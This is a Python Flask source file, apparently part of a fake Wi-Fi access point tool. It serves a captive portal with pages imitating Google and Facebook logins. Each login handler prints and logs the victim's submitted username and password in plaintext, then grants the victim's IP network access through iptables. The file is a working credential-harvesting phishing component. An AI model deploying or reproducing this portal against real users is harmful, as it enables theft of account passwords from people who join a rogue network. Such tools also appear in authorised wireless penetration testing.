from fap import config
import logging

from flask import Flask, request, render_template, redirect, url_for
from fap.iptables import iptables_allow_IP
from fap.logmon import clients_connected, login_client

logging.basicConfig(level=logging.DEBUG,
        format='%(asctime)s - flaskaptive - %(levelname)s - %(message)s',
        filename=config['fap']['log'] + '/' + 'flaskaptive.log')

app = Flask(__name__,
        template_folder=config['flaskaptive']['template_folder'],
        static_url_path='/static',
        static_folder=config['flaskaptive']['static_folder'])

@app.route('/generate_204')
def generate_204():
    if __is_ip_connected__(request.remote_addr) is False:
        return redirect(url_for('login'))
    else:
        return '', 204

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        print('DEFAULT page credentials:',
                request.form['login'], 
                '/', 
                request.form['password'])

        logging.info('DEFAULT page login credentials:'
                + request.form['login'] 
                + '/' 
                + request.form['password'])

        iptables_allow_IP(request.remote_addr)
        login_client(request.remote_addr)

        return '', 200

    return render_template('index.html')

@app.route('/google', methods=['GET', 'POST'])
def google():
    if request.method == 'POST':
        print('GOOGLE credentials:',
                request.form['login'], 
                '/', 
                request.form['password'])

        logging.info('GOOGLE login credentials: '
                + request.form['login'] 
                + '/' 
                + request.form['password'])

        iptables_allow_IP(request.remote_addr)
        login_client(request.remote_addr)

        return '', 200

    return render_template('google/index.html')

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        print('FACEBOOK credentials:',
                request.form['login'], 
                '/', 
                request.form['password'])

        logging.info('FACEBOOK login credentials: '
                + request.form['login'] 
                + '/' 
                + request.form['password'])

        iptables_allow_IP(request.remote_addr)
        login_client(request.remote_addr)

        return '', 200

    return render_template('facebook/index.html')



@app.errorhandler(404)
def error404(e):
    if __is_ip_connected__(request.remote_addr) is False:
        return redirect(url_for('login'))
    else:
        return '404 not found', 404

def __is_ip_connected__(ip: str) -> bool:
    connected = False

    for i in clients_connected:
        if i[0] == request.remote_addr:
            connected = i[3]

    return connected
